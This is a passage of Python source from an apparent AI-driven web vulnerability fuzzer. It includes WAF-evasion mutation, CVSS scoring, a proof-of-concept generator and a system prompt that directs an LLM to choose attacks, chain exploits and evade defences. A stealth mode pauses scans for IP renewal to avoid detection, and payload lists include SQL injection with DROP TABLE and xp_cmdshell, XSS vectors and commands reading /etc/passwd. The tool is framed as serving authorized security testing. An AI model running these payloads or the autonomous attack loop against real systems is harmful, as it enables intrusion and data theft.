        basic_variants = generate_evasion_payloads(payload, waf_type, count)
        return [
            {
                "original": payload,
                "mutated": v,
                "category": "basic_encoding",
                "description": "Basic encoding evasion",
                "confidence": 0.5,
            }
            for v in basic_variants
        ]
    
    waf_name = waf_type.value if hasattr(waf_type, 'value') else str(waf_type)
    
    # Determine mutation categories based on technique
    categories = None
    if technique:
        technique_categories = {
            "sql_injection": ["sql_keyword_obfuscation", "encoding", "concatenation"],
            "sqli": ["sql_keyword_obfuscation", "encoding", "concatenation"],
            "xss": ["encoding", "unicode_substitution", "case_variation"],
            "path_traversal": ["encoding", "null_byte_injection", "path_manipulation"],
            "command_injection": ["encoding", "whitespace_manipulation", "concatenation"],
            "ssti": ["encoding", "unicode_substitution"],
        }
        categories = technique_categories.get(technique.lower())
    
    # Get WAF-specific mutations first
    if waf_type != WafType.NONE:
        waf_results = generate_waf_specific_mutations(payload, waf_name)
        results.extend(waf_results[:count // 2])
    
    # Get general mutations
    remaining = count - len(results)
    if remaining > 0:
        general_results = generate_mutated_payloads(
            payload=payload,
            count=remaining,
            context=context,
            categories=categories,
            avoid_blocked=True,
        )
        results.extend(general_results)
    
    return results[:count]


# =============================================================================
# CVSS SCORING
# =============================================================================

def calculate_cvss(
    technique: str,
    exploitable: bool,
    requires_auth: bool = False,
    user_interaction: bool = False,
    scope_change: bool = False,
    confidentiality_impact: str = "high",
    integrity_impact: str = "high",
    availability_impact: str = "low",
) -> Tuple[float, str]:
    """Calculate CVSS 3.1 score and vector string."""
    
    # Attack Vector (AV)
    av = "N"  # Network
    
    # Attack Complexity (AC) based on technique
    ac_map = {
        "sql_injection": "L",
        "xss": "L",
        "command_injection": "L",
        "path_traversal": "L",
        "ssti": "H",
        "xxe": "L",
        "ssrf": "L",
        "idor": "L",
        "auth_bypass": "H",
        "business_logic": "H",
    }
    ac = ac_map.get(technique, "L")
    
    # Privileges Required (PR)
    pr = "L" if requires_auth else "N"
    
    # User Interaction (UI)
    ui = "R" if user_interaction else "N"
    
    # Scope (S)
    s = "C" if scope_change else "U"
    
    # Impact metrics
    impact_map = {"none": "N", "low": "L", "high": "H"}
    c = impact_map.get(confidentiality_impact, "H")
    i = impact_map.get(integrity_impact, "H")
    a = impact_map.get(availability_impact, "L")
    
    # Construct vector
    vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
    
    # Calculate score (simplified)
    base_scores = {
        ("sql_injection", True): 9.8,
        ("sql_injection", False): 7.5,
        ("command_injection", True): 9.8,
        ("command_injection", False): 7.5,
        ("xss", True): 6.1,
        ("xss", False): 5.4,
        ("path_traversal", True): 7.5,
        ("path_traversal", False): 5.3,
        ("ssti", True): 9.8,
        ("ssti", False): 7.2,
        ("xxe", True): 7.5,
        ("xxe", False): 5.5,
        ("ssrf", True): 9.1,
        ("ssrf", False): 6.5,
        ("idor", True): 6.5,
        ("idor", False): 4.3,
        ("auth_bypass", True): 9.8,
        ("auth_bypass", False): 7.5,
    }
    
    score = base_scores.get((technique, exploitable), 5.0)
    
    return score, vector


def generate_proof_of_concept(
    technique: str,
    endpoint: str,
    method: str,
    payload: str,
    headers: Dict[str, str] = None,
) -> str:
    """Generate a proof-of-concept exploit code."""
    headers = headers or {}
    headers_str = "\n".join(f'    "{k}": "{v}",' for k, v in headers.items())
    
    poc = f'''#!/usr/bin/env python3
"""
Proof of Concept - {technique.replace("_", " ").title()}
Target: {endpoint}
Generated by VRAgent Agentic Fuzzer

IMPORTANT: This POC is for authorized security testing only.
Only run against systems you have permission to test.
"""

import requests

url = "{endpoint}"
method = "{method}"
payload = """{payload}"""

headers = {{
{headers_str}
}}

# SECURITY: SSL verification is enabled by default.
# Only set verify=False for testing against local self-signed certificates.
# NEVER disable SSL verification against production or external targets.
VERIFY_SSL = True

# Execute the exploit
response = requests.request(
    method=method,
    url=url,
    headers=headers,
    data=payload if method in ["POST", "PUT", "PATCH"] else None,
    params={{"test": payload}} if method == "GET" else None,
    verify=VERIFY_SSL,
    timeout=10
)

print(f"Status: {{response.status_code}}")
print(f"Length: {{len(response.text)}}")
print("="*50)
print(response.text[:2000])

# Vulnerability confirmed if response contains:
# - Error messages indicating injection
# - Unexpected data disclosure
# - Behavior changes from baseline
'''
    return poc


# =============================================================================
# LLM INTEGRATION
# =============================================================================

FUZZER_SYSTEM_PROMPT = """You are an expert security fuzzer AI assistant with advanced capabilities. Your role is to intelligently analyze web application responses and decide on the most effective fuzzing strategies.

## Your Capabilities
1. Analyze HTTP responses for vulnerability indicators
2. Interpret technology fingerprints to select optimal techniques
3. Detect WAF/IDS and generate evasion strategies
4. Generate targeted payloads for specific vulnerability types
5. Chain attacks for maximum impact (e.g., SSRF → internal scanning → RCE)
6. Identify subtle behaviors that warrant deeper investigation
7. Calculate severity and exploitability of findings
8. Generate proof-of-concept exploits
9. Perform blind vulnerability detection (time-based, OOB callbacks)
10. Auto-discover new endpoints and parameters from responses

## Available Techniques

**Classic Web Vulnerabilities:**
- sql_injection: SQL injection (Union, Error-based, Blind, Time-based)
- xss: Cross-Site Scripting (Reflected, Stored, DOM-based)
- command_injection: OS command injection
- path_traversal: Directory traversal / LFI
- ssti: Server-Side Template Injection (Jinja2, Twig, Freemarker, etc.)
- xxe: XML External Entity injection
- ssrf: Server-Side Request Forgery
- idor: Insecure Direct Object References
- auth_bypass: Authentication bypass
- business_logic: Business logic flaws
- header_injection: HTTP header injection
- parameter_pollution: HTTP Parameter Pollution

**Injection Variants:**
- nosql_injection: MongoDB/NoSQL injection
- ldap_injection: LDAP injection
- xpath_injection: XPath injection
- crlf_injection: CRLF / HTTP response splitting
- host_header_injection: Host header attacks
- email_injection: Email header injection
- csv_injection: CSV/formula injection
- log_injection: Log injection (Log4Shell, etc.)
- expression_language_injection: EL injection
- ognl_injection: OGNL injection (Struts)
- spel_injection: Spring Expression Language injection

**Authentication & Authorization:**
- jwt_attack: JWT vulnerabilities (alg:none, weak secrets, key confusion)
- oauth_attack: OAuth/OIDC misconfigurations
- saml_attack: SAML vulnerabilities
- session_fixation: Session fixation attacks
- session_hijacking: Session hijacking
- credential_stuffing: Credential stuffing / spraying
- password_reset: Password reset flaws
- mfa_bypass: MFA bypass techniques

**Advanced Request-Level:**
- http_smuggling: HTTP request smuggling (CL.TE, TE.CL, TE.TE, H2)
- race_condition: Race conditions (TOCTOU, double-spend)
- http2_attacks: HTTP/2 specific attacks
- request_splitting: HTTP request splitting

**Client-Side Attacks:**
- prototype_pollution: JavaScript prototype pollution
- dom_clobbering: DOM clobbering
- css_injection: CSS injection
- dangling_markup: Dangling markup injection
- clickjacking: Clickjacking / UI redressing
- postmessage_exploit: PostMessage vulnerabilities

**Cache & CDN:**
- cache_poisoning: Web cache poisoning
- cache_deception: Web cache deception
- cdn_bypass: CDN/WAF bypass

**Configuration Issues:**
- cors_bypass: CORS misconfiguration
- mass_assignment: Mass assignment
- open_redirect: Open redirect
- information_disclosure: Info disclosure
- debug_endpoints: Debug/admin endpoints
- default_credentials: Default credentials

**Deserialization:**
- insecure_deserialization: Generic deserialization
- java_deserialization: Java deserialization
- php_deserialization: PHP deserialization
- python_pickle: Python pickle
- dotnet_deserialization: .NET deserialization

**File-Based:**
- file_upload: Malicious file upload
- file_inclusion: Remote/Local file inclusion
- zip_slip: Zip slip path traversal
- svg_xss: SVG-based XSS
- pdf_injection: PDF injection

**API Security (OWASP API Top 10):**
- bola: Broken Object Level Authorization
- bfla: Broken Function Level Authorization
- excessive_data_exposure: Excessive data exposure
- graphql: GraphQL attacks (introspection, batching, DoS)
- websocket: WebSocket vulnerabilities

**Cryptographic:**
- padding_oracle: Padding oracle attacks
- weak_crypto: Weak cryptography
- timing_attack: Timing side-channels

**Cloud-Specific:**
- cloud_metadata: Cloud metadata SSRF
- bucket_takeover: S3/Cloud bucket takeover
- subdomain_takeover: Subdomain takeover

**CMS-Specific:**
- wordpress_exploit: WordPress vulnerabilities
- drupal_exploit: Drupal vulnerabilities
- joomla_exploit: Joomla vulnerabilities

## Response Format
Always respond with valid JSON in this format:
{
    "analysis": "Your chain-of-thought analysis",
    "decision": "next_action",
    "technique": "technique_name",
    "payloads": ["payload1", "payload2"],
    "evasion_needed": false,
    "evasion_encodings": ["url", "double_url"],
    "blind_detection": {
        "enabled": true,
        "type": "time_based|oob_callback",
        "delay_seconds": 5
    },
    "attack_chain": {
        "name": "ssrf_to_rce",
        "continue": true,
        "step_payloads": ["payload for current step"]
    },
    "finding": {
        "technique": "sql_injection",
        "severity": "critical|high|medium|low|info",
        "title": "Finding title",
        "description": "Detailed description",
        "payload": "The successful payload",
        "evidence": ["Evidence line 1", "Evidence line 2"],
        "exploitable": true,
        "requires_auth": false,
        "user_interaction": false,
        "recommendation": "How to fix",
        "cwe_id": "CWE-89"
    },
    "discovery": {
        "new_endpoints": ["/api/admin", "/api/users"],
        "new_parameters": ["id", "token", "callback"]
    },
    "reasoning": "Why you made this decision",
    "priority_score": 0.0-1.0,
    "next_steps": ["follow-up action 1"]
}

## Decision Types
- select_technique: Choose a fuzzing technique
- generate_payloads: Create custom payloads
- analyze_results: Examine fuzzing results
- blind_detect: Perform blind vulnerability detection (time-based or OOB)
- chain_attack: Execute a multi-step attack chain
- discover_endpoints: Parse response for new attack surface
- exploit_finding: Attempt exploitation
- evade_waf: Apply WAF evasion techniques
- generate_poc: Generate proof-of-concept
- jwt_attack: Test JWT tokens for vulnerabilities (alg=none, weak secrets, claim tampering)
- http_smuggling: Test for HTTP request smuggling vulnerabilities
- race_condition: Test for race condition/TOCTOU vulnerabilities
- oob_check: Check for out-of-band callbacks received
- move_to_next_endpoint: Move to next target
- complete: Finish fuzzing

## Attack Chains (Multi-Step Exploitation)
When you identify potential for chained attacks, use these templates:

**Classic Chains:**
- ssrf_to_rce: SSRF → Internal Services → Command Execution
- sqli_to_data_exfil: SQL Injection → Schema Discovery → Data Extraction
- lfi_to_rce: LFI → Log Access → Log Poisoning → RCE
- xxe_to_ssrf: XXE → Internal Network Scanning → File Read
- auth_bypass_to_admin: Auth Bypass → IDOR → Privilege Escalation

**HTTP Smuggling Chains:**
- smuggling_to_cache_poison: Request Smuggling → Cache Manipulation → Stored XSS
- smuggling_to_auth_bypass: Request Smuggling → Frontend Bypass → Admin Access
- smuggling_to_request_hijack: CL.TE/TE.CL → Prefix Injection → Credential Theft

**Race Condition Chains:**
- race_to_double_spend: Transaction Race → Balance Bypass → Financial Fraud
- race_to_privilege_escalation: Signup Race → Role Confusion → Elevated Access
- race_to_coupon_abuse: Coupon Race → Unlimited Redemption

**JWT Attack Chains:**
- jwt_to_admin_access: alg:none → Claim Tampering → Admin Access
- jwt_to_account_takeover: RS256/HS256 Confusion → Token Forge → Account Takeover

**SSTI Chains:**
- ssti_to_rce: Template Injection → Class Traversal → Command Execution
- ssti_to_secrets: SSTI → Config Access → Credential Theft

**Prototype Pollution Chains:**
- prototype_to_rce: Object Pollution → ENV Manipulation → RCE
- prototype_to_xss: Prototype Pollution → DOM Pollution → XSS

**Cache Poisoning Chains:**
- cache_poison_to_xss: Header Injection → Cache Poisoning → Mass XSS
- cache_deception_to_data_theft: Path Extension → Cache Deception → Data Leak

**GraphQL Chains:**
- graphql_introspection_to_data: Introspection → Schema Discovery → Data Exfil
- graphql_batching_to_bruteforce: Query Batching → Rate Limit Bypass → Brute Force

**CORS Chains:**
- cors_to_data_theft: Origin Reflection → Cross-Origin Request → Data Theft

**Mass Assignment Chains:**
- mass_assign_to_admin: Model Binding → Role Injection → Admin Access

**WebSocket Chains:**
- websocket_to_csrf: No Origin Check → Cross-Origin Connect → Action Execution
- websocket_to_injection: Message Parsing → Command Injection

**Deserialization Chains:**
- deserialization_to_rce: Serialized Input → Gadget Chain → RCE

**Open Redirect Chains:**
- open_redirect_to_oauth_theft: Open Redirect → OAuth Redirect_URI → Token Theft

Include attack_chain in response when chaining vulnerabilities.

## Blind Detection
For vulnerabilities without visible response differences:
- Time-based: Use SLEEP/WAITFOR payloads, compare response times to baseline
- OOB Callbacks: Use callback URLs to detect out-of-band interactions
- DNS Rebinding: For SSRF that doesn't reflect in response

When using blind detection, analyze response_time differences (baseline vs payload).
A difference > 4 seconds typically indicates successful time-based injection.

## Auto-Discovery
Always analyze responses for:
- HTML: forms, links, hidden inputs, API endpoints in scripts
- JSON: URL fields, path fields, endpoint references
- Parameters: in URLs, forms, JSON keys that could be fuzzable

Report discovered endpoints in your response for automatic testing.

## Guidelines
1. Start with fingerprinting to understand the technology stack
2. If WAF detected, use evasion techniques before giving up
3. Chain vulnerabilities when possible (SSRF→RCE)
4. Generate varied payloads - don't repeat failed patterns
5. Look for subtle indicators: timing differences, response size changes
6. Use blind detection when normal payloads show no visible difference
7. Always analyze responses for new endpoints to expand attack surface
8. Assign accurate severity based on impact
9. Always include CWE IDs when reporting findings
10. Generate working PoC code for confirmed vulnerabilities
"""


# =============================================================================
# LLM-POWERED JAVASCRIPT ANALYSIS FOR INTELLIGENT ENDPOINT DISCOVERY
# =============================================================================

LLM_JS_ANALYSIS_PROMPT = """You are a security researcher analyzing JavaScript code to find API endpoints and authentication mechanisms.

Analyze the following JavaScript/HTML content from a web page and extract:

1. **API Endpoints**: Any URLs, paths, or endpoints that are called by the JavaScript code. Look for:
   - fetch(), axios, XMLHttpRequest, $.ajax calls
   - ANY function calls with path arguments like obj.method("/path", ...) 
   - URL variable assignments (apiUrl, endpoint, baseUrl, authUrl, etc.)
   - Form action attributes
   - WebSocket URLs

2. **Authentication Mechanism**: How does this page authenticate users?
   - Is there SRP (Secure Remote Password)?
   - OAuth/OpenID?
   - JWT tokens?
   - Custom auth libraries?
   - What endpoint handles authentication?

3. **Hidden Form Fields**: Any hidden inputs with default values (often contains default usernames/tokens)

4. **CSRF Tokens**: Location and name of any CSRF protection tokens

Return your analysis as JSON:
```json
{
    "endpoints": [
        {"path": "/authenticate", "method": "POST", "purpose": "SRP authentication step", "confidence": 0.95},
        {"path": "/api/login", "method": "POST", "purpose": "Login form submission", "confidence": 0.9}
    ],
    "auth_mechanism": {
        "type": "srp|oauth|jwt|form|basic|custom",
        "library": "srp-min.js or other detected library",
        "auth_endpoint": "/authenticate",
        "details": "Description of how auth works"
    },
    "hidden_fields": [
        {"name": "username", "default_value": "admin", "element_id": "hidden-user"}
    ],
    "csrf": {
        "token_name": "CSRFtoken",
        "location": "meta tag or hidden input"
    },
    "additional_findings": ["Any other security-relevant observations"]
}
```

Be thorough - look at the ACTUAL JavaScript code patterns, not just obvious patterns. For example, if you see:
- `srp.identify("/authenticate", user, pass)` → the auth endpoint is `/authenticate`
- `var authUrl = "/api/v1/auth"` → endpoint is `/api/v1/auth`
- `fetch(baseUrl + "/users/login")` → endpoint is `/users/login`

=== CONTENT TO ANALYZE ===
"""


async def analyze_javascript_with_llm(
    html_content: str,
    base_url: str,
    max_content_length: int = 30000,
) -> Dict[str, Any]:
    """
    Use LLM to intelligently analyze JavaScript code and extract endpoints.
    
    This does what a human security researcher would do - read the code,
    understand the context, and identify the actual API endpoints being used.
    """
    if not html_content:
        return {"endpoints": [], "auth_mechanism": None, "error": "No content to analyze"}
    
    # Extract relevant portions of the HTML/JS for analysis
    # Focus on script tags and form-related HTML
    analysis_content = []
    
    # Extract inline scripts
    script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.DOTALL | re.IGNORECASE)
    for script in script_matches:
        if script.strip() and len(script) > 50:  # Skip tiny scripts
            analysis_content.append(f"<!-- Inline Script -->\n{script[:8000]}")  # Limit per script
    
    # Extract forms and inputs (important context for auth)
    form_matches = re.findall(r'<form[^>]*>.*?</form>', html_content, re.DOTALL | re.IGNORECASE)
    for form in form_matches[:5]:  # Max 5 forms
        analysis_content.append(f"<!-- Form -->\n{form[:2000]}")
    
    # Extract meta tags (often contain CSRF tokens)
    meta_matches = re.findall(r'<meta[^>]+>', html_content, re.IGNORECASE)
    if meta_matches:
        analysis_content.append(f"<!-- Meta Tags -->\n" + "\n".join(meta_matches[:20]))
    
    # Extract input fields (especially hidden ones)
    input_matches = re.findall(r'<input[^>]+>', html_content, re.IGNORECASE)
    if input_matches:
        analysis_content.append(f"<!-- Input Fields -->\n" + "\n".join(input_matches[:30]))
    
    # Extract external script URLs (useful context)
    script_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
    if script_urls:
        analysis_content.append(f"<!-- External Scripts -->\n" + "\n".join(script_urls[:15]))
    
    combined_content = "\n\n".join(analysis_content)
    
    # Truncate if too long
    if len(combined_content) > max_content_length:
        combined_content = combined_content[:max_content_length] + "\n\n[Content truncated...]"
    
    if len(combined_content) < 100:
        return {"endpoints": [], "auth_mechanism": None, "error": "Insufficient content for analysis"}
    
    # Build the LLM prompt
    full_prompt = LLM_JS_ANALYSIS_PROMPT + f"\nBase URL: {base_url}\n\n{combined_content}"
    
    try:
        messages = [
            {"role": "system", "content": "You are a security researcher expert at analyzing JavaScript code to find API endpoints. Return only valid JSON."},
            {"role": "user", "content": full_prompt}
        ]
        
        response = await call_llm(messages, temperature=0.3, max_tokens=2000)
        
        # Parse the JSON response
        result = parse_llm_response(response)
        
        # Validate and normalize endpoints
        if "endpoints" in result:
            normalized_endpoints = []
            for ep in result["endpoints"]:
                if isinstance(ep, dict) and ep.get("path"):
                    path = ep["path"]
                    # Ensure path is properly formatted
                    if not path.startswith(("http://", "https://", "/")):
                        path = "/" + path
                    normalized_endpoints.append({
                        "path": path,
                        "method": ep.get("method", "POST").upper(),
                        "purpose": ep.get("purpose", ""),
                        "confidence": float(ep.get("confidence", 0.8)),
                    })
            result["endpoints"] = normalized_endpoints
        
        logger.info(f"[LLM-JS-ANALYSIS] Found {len(result.get('endpoints', []))} endpoints via LLM analysis")
        if result.get("auth_mechanism"):
            logger.info(f"[LLM-JS-ANALYSIS] Auth mechanism: {result['auth_mechanism'].get('type')} via {result['auth_mechanism'].get('auth_endpoint')}")
        
        return result
        
    except Exception as e:
        logger.warning(f"LLM JavaScript analysis failed: {e}")
        return {"endpoints": [], "auth_mechanism": None, "error": str(e)}


async def call_llm(
    messages: List[Dict[str, str]],
    temperature: float = 0.7,
    max_tokens: int = 4000,
) -> str:
    """Call the LLM API with retry logic and circuit breaker."""
    
    # Check circuit breaker
    if not _llm_circuit_breaker.can_execute():
        raise Exception("LLM circuit breaker open - too many failures. Waiting for recovery.")
    
    async def _call_llm_internal():
        # Try Gemini first
        if settings.gemini_api_key:
            return await _call_gemini(messages, temperature, max_tokens)
        
        # Fall back to OpenAI-compatible API
        if settings.openai_api_key:
            return await _call_openai(messages, temperature, max_tokens)
        
        raise ValueError("No LLM API key configured. Set GEMINI_API_KEY or OPENAI_API_KEY.")
    
    try:
        result = await retry_with_backoff(
            _call_llm_internal,
            config=RetryConfig(
                max_retries=2,
                base_delay=2.0,
                max_delay=15.0,
                retry_on_exceptions=(Exception,),  # Retry on any exception
            ),
            circuit_breaker=_llm_circuit_breaker,
        )
        return result
    except Exception as e:
        logger.error(f"LLM call failed after retries: {e}")
        raise


async def _call_gemini(
    messages: List[Dict[str, str]],
    temperature: float,
    max_tokens: int,
) -> str:
    """Call Google Gemini API using the google-genai SDK."""
    from google import genai
    from google.genai import types

    client = genai.Client(api_key=settings.gemini_api_key)

    # Convert messages to Gemini format - combine into a single prompt
    system_prompt = ""
    conversation = []

    for msg in messages:
        if msg["role"] == "system":
            system_prompt = msg["content"]
        elif msg["role"] == "user":
            conversation.append(f"User: {msg['content']}")
        elif msg["role"] == "assistant":
            conversation.append(f"Assistant: {msg['content']}")

    # Build the full prompt
    full_prompt = ""
    if system_prompt:
        full_prompt = f"{system_prompt}\n\n"
    full_prompt += "\n".join(conversation)
    if conversation:
        full_prompt += "\nAssistant:"

    # Use the model from settings - default to gemini-3-flash-preview
    model_id = settings.gemini_model_id or "gemini-3-flash-preview"

    # Map temperature to Gemini 3 thinking_level
    # (temperature kept in signature for OpenAI compatibility)
    if temperature <= 0.2:
        thinking_level = "low"
    elif temperature <= 0.4:
        thinking_level = "medium"
    else:
        thinking_level = "high"

    # Use Gemini 3's thinking_config for reasoning control
    config = types.GenerateContentConfig(
        thinking_config=types.ThinkingConfig(thinking_level=thinking_level),
        max_output_tokens=max_tokens,
    )
    
    # Wrap the API call with a timeout to prevent indefinite hangs
    # Gemini with "thinking" mode can take 60+ seconds for complex requests
    LLM_CALL_TIMEOUT = 90.0  # 90 seconds max per LLM call
    
    try:
        response = await asyncio.wait_for(
            asyncio.to_thread(
                client.models.generate_content,
                model=model_id,
                contents=full_prompt,
                config=config,
            ),
            timeout=LLM_CALL_TIMEOUT
        )
    except asyncio.TimeoutError:
        logger.warning(f"Gemini API call timed out after {LLM_CALL_TIMEOUT}s")
        raise Exception(f"LLM call timed out after {LLM_CALL_TIMEOUT} seconds - model may be overloaded")
    
    return response.text if response.text else ""


async def _call_openai(
    messages: List[Dict[str, str]],
    temperature: float,
    max_tokens: int,
) -> str:
    """Call OpenAI-compatible API."""
    # Use longer timeout for LLM calls (can take a while for complex responses)
    async with httpx.AsyncClient(timeout=120.0) as client:
        headers = {
            "Authorization": f"Bearer {settings.openai_api_key}",
            "Content-Type": "application/json",
        }
        
        payload = {
            "model": settings.openai_model or "gpt-4",
            "messages": messages,
            "temperature": temperature,
            "max_tokens": max_tokens,
        }
        
        base_url = settings.openai_base_url or "https://api.openai.com/v1"
        
        response = await client.post(
            f"{base_url}/chat/completions",
            headers=headers,
            json=payload,
        )
        if response.status_code != 200:
            raise Exception(f"OpenAI API error: {response.text}")
        
        data = response.json()
        return data["choices"][0]["message"]["content"]


def parse_llm_response(response: str) -> Dict[str, Any]:
    """Parse LLM response, extracting JSON from markdown if needed."""
    # Try to extract JSON from markdown code blocks
    json_match = re.search(r'```(?:json)?\s*\n?(.*?)\n?```', response, re.DOTALL)
    if json_match:
        response = json_match.group(1)
    
    # Try direct JSON parse
    try:
        return json.loads(response.strip())
    except json.JSONDecodeError:
        # Try to find JSON object in response
        json_obj_match = re.search(r'\{.*\}', response, re.DOTALL)
        if json_obj_match:
            try:
                return json.loads(json_obj_match.group(0))
            except json.JSONDecodeError:
                pass
    
    # Try to extract key fields from truncated JSON response
    result = {
        "analysis": response[:500] if len(response) > 500 else response,
        "reasoning": "Parsed from truncated response",
        "priority_score": 0.5,
    }
    
    # Extract decision field
    decision_match = re.search(r'"decision"\s*:\s*"([^"]+)"', response)
    if decision_match:
        result["decision"] = decision_match.group(1)
    else:
        result["decision"] = "analyze_results"
    
    # Extract technique field
    technique_match = re.search(r'"technique"\s*:\s*"([^"]+)"', response)
    if technique_match:
        result["technique"] = technique_match.group(1)
    
    # Extract payloads array (partial)
    payloads_match = re.search(r'"payloads"\s*:\s*\[(.*?)\]', response, re.DOTALL)
    if payloads_match:
        try:
            # Try to parse just the payloads array
            payloads_str = payloads_match.group(1)
            # Extract individual string payloads
            payload_items = re.findall(r'"([^"]*)"', payloads_str)
            if payload_items:
                result["payloads"] = payload_items[:10]  # Limit to 10
        except Exception:
            pass
    
    return result


# =============================================================================
# FUZZING EXECUTION
# =============================================================================

async def _execute_single_request(
    url: str,
    method: str,
    headers: Dict[str, str],
    body: Optional[str],
    timeout: int,
) -> httpx.Response:
    """Execute a single HTTP request (for retry wrapper)."""
    async with httpx.AsyncClient(verify=True, timeout=timeout) as client:
        return await client.request(
            method=method,
            url=url,
            headers=headers,
            content=body,
        )


async def execute_fuzzing_request(
    target: FuzzingTarget,
    payload: str,
    position: str = "param",
    timeout: int = 30,  # Increased default timeout for robustness
    use_rate_limit: bool = True,
    use_retry: bool = True,
    auth_manager: AuthManager = None,
    skip_dedup_check: bool = False,
    session: 'AgenticFuzzingSession' = None,  # Optional session for stealth mode
) -> Dict[str, Any]:
    """Execute a single fuzzing request with rate limiting, retry logic, authentication, and optional stealth mode."""
    start_time = time.time()
    
    # Apply stealth mode delay if enabled - with full error protection
    ip_renewal_needed = False
    try:
        if session and getattr(session, 'stealth_mode_enabled', False):
            stealth_delay, ip_renewal_needed = await apply_stealth_delay(session)
            if stealth_delay > 0:
                logger.debug(f"[Stealth] Delayed request by {stealth_delay:.2f}s")
            
            # If IP renewal is needed, return early with special flag
            if ip_renewal_needed:
                return {
                    "success": False,
                    "error": "ip_renewal_needed",
                    "message": "Scan paused - IP renewal required to avoid detection",
                    "payload": payload,
                    "response_time": 0,
                    "ip_renewal_needed": True,
                    "requests_since_last_renewal": getattr(session, 'stealth_ip_renewal_count', 0),
                }
    except Exception as stealth_err:
        logger.warning(f"[Stealth] Stealth delay failed (non-fatal, continuing): {stealth_err}")
    
    # Apply rate limiting
    if use_rate_limit:
        wait_time = await _rate_limiter.acquire()
        if wait_time > 0:
            logger.debug(f"Rate limited - waited {wait_time:.2f}s")
    
    # Check request deduplication (skip for baseline requests or explicit skip)
    if not skip_dedup_check and position != "none" and payload:
        is_dup, reason = _request_deduplicator.is_duplicate(
            target.url, target.method, payload, position
        )
        if is_dup:
            return {
                "success": False,
                "error": "duplicate_request",
                "message": reason,
                "payload": payload,
                "response_time": 0,
                "skipped": True,
            }
    
    # Get per-domain circuit breaker
    domain_breaker = _domain_circuit_breakers.get_breaker_sync(target.url)
    
    # Check domain-specific circuit breaker
    if not domain_breaker.can_execute():
        return {
            "success": False,
            "error": "circuit_breaker_open",
            "message": f"Circuit breaker open for domain - too many failures",
            "payload": payload,
            "response_time": 0,
            "domain_circuit_breaker": domain_breaker.get_state(),
        }
    
    try:
        # Prepare URL with payload
        url = target.url
        headers = dict(target.headers)
        body = target.body
        
        # Apply stealth mode headers if enabled
        if session and session.stealth_mode_enabled:
            headers = get_stealth_headers(session, headers)
        
        # Apply authentication if configured
        auth = auth_manager or _auth_manager
        if auth.config.auth_type != AuthType.NONE:
            auth_headers = await auth.get_auth_headers()
            headers.update(auth_headers)
            
            # Add auth params to URL if needed
            auth_params = auth.get_auth_params()
            if auth_params:
                separator = "&" if "?" in url else "?"
                param_str = "&".join(f"{k}={v}" for k, v in auth_params.items())
                url = f"{url}{separator}{param_str}"
        
        if position == "none":
            # No payload injection - just baseline request
            pass
        elif position == "url":
            url = url.replace("FUZZ", payload)
        elif position == "header":
            for key, value in headers.items():
                headers[key] = value.replace("FUZZ", payload)
        elif position == "body" and body:
            body = body.replace("FUZZ", payload)
        elif payload:  # Only add param if payload is non-empty
            # Default: append as query param
            separator = "&" if "?" in url else "?"
            url = f"{url}{separator}test={payload}"
        
        # Execute with retry logic (using domain-specific circuit breaker)
        if use_retry:
            response = await retry_with_backoff(
                _execute_single_request,
                url, target.method, headers, body, timeout,
                config=_retry_config,
                circuit_breaker=domain_breaker,
            )
        else:
            response = await _execute_single_request(url, target.method, headers, body, timeout)
        
        response_body = response.text
        response_time = (time.time() - start_time) * 1000
        
        # Update rate limiter with response
        if use_rate_limit:
            _rate_limiter.record_response(response.status_code, response_time)
        
        # Record success with domain circuit breaker
        domain_breaker.record_success()
        
        return {
            "success": True,
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "body": response_body[:10000],  # Limit body size
            "body_length": len(response_body),
            "response_time": response_time,
            "payload": payload,
            "url": url,
            "rate_limiter_stats": _rate_limiter.get_stats() if use_rate_limit else None,
        }
                
    except httpx.TimeoutException:
        domain_breaker.record_failure()
        return {
            "success": False,
            "error": "timeout",
            "payload": payload,
            "response_time": (time.time() - start_time) * 1000,
            "retried": use_retry,
        }
    except Exception as e:
        domain_breaker.record_failure()
        error_msg = str(e)
        is_circuit_open = "circuit breaker" in error_msg.lower()
        return {
            "success": False,
            "error": error_msg,
            "payload": payload,
            "response_time": (time.time() - start_time) * 1000,
            "retried": use_retry and not is_circuit_open,
            "circuit_breaker_state": domain_breaker.get_state(),
        }


# =============================================================================
# PAYLOAD GENERATION
# =============================================================================

TECHNIQUE_PAYLOADS = {
    FuzzingTechnique.SQL_INJECTION: [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
        "'; DROP TABLE users--", "1' ORDER BY 1--", "1' UNION SELECT NULL--",
        "' AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--",
        "1; EXEC xp_cmdshell('whoami')--", "' AND 1=CONVERT(int,@@version)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND IF(1=1,SLEEP(5),0)--", "1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--",
    ],
    FuzzingTechnique.XSS: [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>", "javascript:alert('XSS')",
        "<body onload=alert('XSS')>", "\"><script>alert('XSS')</script>",
        "'-alert('XSS')-'", "<img src=\"x\" onerror=\"alert('XSS')\">",
        "{{constructor.constructor('alert(1)')()}}", "${alert('XSS')}",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<svg><animate onbegin=alert(1)>", "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>", "<input onfocus=alert(1) autofocus>",
    ],
    FuzzingTechnique.COMMAND_INJECTION: [
        "; ls -la", "| ls -la", "& ls -la", "&& ls -la", "|| ls -la",
        "`ls -la`", "$(ls -la)", "; cat /etc/passwd", "| whoami",
        "; ping -c 5 127.0.0.1", "| sleep 5", "; id",
        "$((1+1))", "${IFS}", ";${IFS}cat${IFS}/etc/passwd",
        "\n/bin/cat /etc/passwd", "a]};{cat,/etc/passwd};#",
